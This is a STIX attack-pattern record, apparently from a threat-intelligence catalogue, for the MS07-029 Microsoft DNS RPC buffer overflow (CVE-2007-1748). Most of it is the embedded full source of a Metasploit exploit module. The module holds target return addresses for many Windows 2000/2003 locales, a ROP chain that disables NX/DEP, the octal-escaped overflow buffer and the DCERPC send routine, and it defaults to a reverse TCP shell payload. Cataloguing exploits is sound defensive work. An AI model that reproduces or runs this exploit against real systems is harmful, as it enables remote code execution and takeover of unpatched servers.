{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ae6925a9-a580-4ccf-ae9a-1e281f17d707",
    "created": "2024-08-14T16:39:39.556949Z",
    "modified": "2024-08-14T16:39:39.556953Z",
    "name": "MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (TCP)",
    "description": " This module exploits a stack buffer overflow in the RPC interface of the Microsoft DNS service. The vulnerability is triggered when a long zone name parameter is supplied that contains escaped octal strings. This module is capable of bypassing NX/DEP protection on Windows 2003 SP1/SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/dcerpc/ms07_029_msdns_zonename.rb",
            "external_id": "ms07_029_msdns_zonename.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1748"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::DCERPC\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (TCP)',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the RPC interface\n        of the Microsoft DNS service. The vulnerability is triggered\n        when a long zone name parameter is supplied that contains\n        escaped octal strings. This module is capable of bypassing NX/DEP\n        protection on Windows 2003 SP1/SP2.\n      },\n      'Author'         =>\n        [\n          'hdm',     # initial module\n          'Unknown', # 2 unknown contributors (2003 support)\n          'bcoles'   # additional target offsets\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-1748'],\n          ['OSVDB', '34100'],\n          ['MSB', 'MS07-029']\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'PAYLOAD' => 'windows/shell/reverse_tcp'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n\n          # The payload doesn't matter, but make_nops() uses these too\n          'BadChars' => \"\\x00\",\n\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic (2000 SP0-SP4, 2003 SP0-SP2)', { } ],\n\n          # p/p/r WS2HELP.DLL\n          [ 'Windows 2000 Server SP0-SP4+ English', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x75022ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ French', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fa2ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ German', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74f92ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ Italian', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fd2ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ Polish', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fb2ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ Portuguese', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fd2ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ Korean', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74f92ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ Russian', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fb2ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ Simplified Chinese', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fa2ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ Spanish', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fd2ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ Swedish', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fa2ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ Traditional Chinese', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fa2ac4 } ],\n          [ 'Windows 2000 Server SP0-SP4+ Turkish', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x74fc2ac4 } ],\n\n          # Use the __except_handler3 method (and jmp esp in ATL.dll)\n          [ 'Windows 2003 Server SP0 English', { 'OS' => '2003SP0', 'Off' => 1593, 'Rets' => [0x77f45a34, 0x77f7e7f0, 0x76a935bf] } ],\n          [ 'Windows 2003 Server SP0 French', { 'OS' => '2003SP0', 'Off' => 1593, 'Rets' => [0x77f35a34, 0x77f6e7f0, 0x76a435bf] } ],\n\n          # ATL.DLL (bypass DEP/NX, IB -> Image Base of ATL.dll)\n          [ 'Windows 2003 Server SP1-SP2 English', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76a80000 } ],\n          [ 'Windows 2003 Server SP1-SP2 French', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76a30000 } ],\n          [ 'Windows 2003 Server SP1-SP2 Spanish', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76a30000 } ],\n          [ 'Windows 2003 Server SP1-SP2 Italian', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76970000 } ],\n          [ 'Windows 2003 Server SP1-SP2 German', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76970000 } ],\n          [ 'Windows 2003 Server SP1-SP2 Russian', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x769a0000 } ],\n          [ 'Windows 2003 Server SP1-SP2 Simplified Chinese', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x769c0000 } ],\n        ],\n      'DisclosureDate' => '2007-04-12',\n      'DefaultTarget'  => 0 ))\n\n    register_options(\n      [\n        Opt::RPORT(0),\n        OptString.new('Locale', [ true,  \"Locale for automatic target (English, French, Italian, ...)\", 'English'])\n      ])\n  end\n\n\n  def gettarget(os)\n\n    targets.each do |target|\n      if ((target['OS'] =~ /#{os}/) && (target.name =~ /#{datastore['Locale']}/))\n        return target\n      end\n    end\n\n    return nil\n  end\n\n\n  def exploit\n\n\n    # Ask the endpoint mapper to locate the port for us\n    dport = datastore['RPORT'].to_i\n\n    if ((dport != 0) && (target.name =~ /Automatic/))\n      print_error(\"Unable to use automatic targeting when RPORT is given\");\n      return\n    end\n\n    if (dport == 0)\n\n      dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], '50abc2a4-574d-40b3-9d66-ee4fd5fba076', '5.0', 'ncacn_ip_tcp')\n\n      if (not dport)\n        print_error(\"Could not determine the RPC port used by the Microsoft DNS Server\")\n        return\n      end\n\n      print_status(\"Discovered Microsoft DNS Server RPC service on port #{dport}\")\n    end\n\n\n    mytarget = nil\n\n    if (target.name =~ /Automatic/)\n\n      # scheduler service is only available on 2k3 SP0 and 2000\n      schedport = dcerpc_endpoint_find_tcp(datastore['RHOST'], '1ff70682-0a51-30e8-076d-740be8cee98b', '1.0', 'ncacn_ip_tcp')\n\n      if (not schedport)\n        print_status(\"Detected a Windows 2003 SP1-SP2 target...\")\n        mytarget = gettarget('2003SP12')\n      else\n        # only available on 2003 SP0\n        schedport = dcerpc_endpoint_find_tcp(datastore['RHOST'], '0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53', '1.0', 'ncacn_ip_tcp')\n\n        if (not schedport)\n          print_status(\"Detected a Windows 2000 SP0-SP4 target...\")\n          mytarget = gettarget('2000')\n        else\n          print_status(\"Detected a Windows 2003 SP0 target...\")\n          mytarget = gettarget('2003SP0')\n        end\n      end\n\n      if (not mytarget)\n        fail_with(Failure::NoTarget, \"There is no available target for '#{datastore['LOCALE']}' locale\")\n      end\n    else\n      mytarget = target\n    end\n\n\n\n    # Connect to the high RPC port\n    connect(true, { 'RPORT' => dport })\n    print_status(\"Trying target #{mytarget.name}...\")\n\n    # Bind to the service\n    handle = dcerpc_handle('50abc2a4-574d-40b3-9d66-ee4fd5fba076', '5.0', 'ncacn_ip_tcp', [datastore['RPORT']])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    # Create our buffer with our shellcode first\n    txt = Rex::Text.rand_text_alphanumeric(8192)\n\n    if (mytarget['OS'] =~ /2000/)\n      txt[0, payload.encoded.length] = payload.encoded\n\n      off = mytarget['Off']\n      txt[ off ] = [mytarget.ret].pack('V')\n      txt[ off - 4, 2] = \"\\xeb\\x06\"\n      txt[ off + 4, 5] = \"\\xe9\" + [ (off+9) * -1 ].pack('V')\n\n    elsif (mytarget['OS'] =~ /2003SP0/)\n      txt[0, payload.encoded.length] = payload.encoded\n\n      off = mytarget['Off']\n      txt[ off ] = [mytarget['Rets'][0]].pack('V')  # __except_handler3\n      txt[ off - 4, 2] = \"\\xeb\\x16\"\n\n      # addr = A + B*12 + 4 = 0x77f7e7f0  (ntdll -> 0x77f443c9)\n      addr  = mytarget['Rets'][1] - 4\n      addr1 = addr / 2\n      addr2 = addr1 + addr % 2\n      addr1 = addr1 + (addr2 % 12)\n      addr2 = addr2 / 12\n\n      txt[ off + 4, 8] = [addr1, addr2].pack('VV') # A,B\n\n      #\n      # then mov eax, [addr] sets eax to 0x77f443c9 and the code goes here :\n      #\n      # 0x77f443c9 jmp off_77f7e810[edx*4]   ;  edx = 0 so jmp to 77f443d0\n      # 0x77f443d0 mov eax, [ebp+arg_0]\n      # 0x77f443d3 pop esi\n      # 0x77f443d4 pop edi\n      # 0x77f443d5 leave    ; mov esp, ebp\n      # 0x77f443d6 retn     ; ret\n\n      txt[ off + 16, 4] = [mytarget['Rets'][2]].pack('V')  # jmp esp\n      txt[ off + 20, 5] = \"\\xe9\" + [ (off+23) * -1 ].pack('V')\n\n    elsif (mytarget['OS'] =~ /2003SP12/)\n      off = mytarget['Off']\n      ib  = mytarget['IB']\n      txt[ off ] = [ib + 0x2566].pack('V')\n\n\n      # to bypass NX we need to emulate the call to ZwSetInformationProcess\n      # with generic value (to work on SP1-SP2 + patches)\n\n      off = 445\n\n      # first we set esi to 0xed by getting the value on the stack\n      #\n      # 0x76a81da7:\n      # pop esi   <- esi = edh\n      # retn\n\n      txt[ off + 4, 4 ] = [ib + 0x1da7].pack('V')\n      txt[ off + 28, 4] = [0xed].pack('V')\n\n      # now we set ecx to 0x7ffe0300, eax to 0xed\n      # 0x76a81da4:\n      # pop ecx    <-  ecx = 0x7ffe0300\n      # mov eax, esi   <- eax == edh\n      # pop esi\n      # retn\n\n      txt[ off + 32, 4] = [ib + 0x1da4].pack('V')\n      txt[ off + 36, 4] = [0x7ffe0300].pack('V')\n\n      # finally we call NtSetInformationProcess (-1, 34, 0x7ffe0270, 4)\n      # 0x7FFE0270 is a pointer to 0x2 (os version info :-) to disable NX\n      # 0x76a8109c:\n      # call dword ptr [ecx]\n\n      txt[ off + 44, 4] = [ib + 0x109c].pack('V')  # call dword ptr[ecx]\n      txt[ off + 52, 16] = [-1, 34, 0x7FFE0270, 4].pack('VVVV')\n\n      # we catch the second exception to go back to our shellcode, now that\n      # NX is disabled\n\n      off = 1013\n      txt[ off, 4 ] = [ib + 0x135bf].pack('V')   # (jmp esp in atl.dll)\n      txt[ off + 24, payload.encoded.length ] = payload.encoded\n\n    end\n\n    req = ''\n\n    # Convert the string to escaped octal\n    txt.unpack('C*').each do |c|\n      req << \"\\\\\"\n      req << c.to_s(8)\n    end\n\n    # Build the RPC stub data\n    stubdata =\n      NDR.long(rand(0xffffffff)) +\n      NDR.wstring(Rex::Text.rand_text_alpha(1) + \"\\x00\\x00\") +\n\n      NDR.long(rand(0xffffffff)) +\n      NDR.string(req + \"\\x00\") +\n\n      NDR.long(rand(0xffffffff)) +\n      NDR.string(Rex::Text.rand_text_alpha(1) + \"\\x00\")\n\n    print_status('Sending exploit...')\n\n    begin\n      response = dcerpc.call(1, stubdata)\n\n      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n        print_status(\">> \" + dcerpc.last_response.stub_data.unpack(\"H*\")[0])\n      end\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-04-12",
    "x_mitre_platforms": [
        "win'"
    ]
}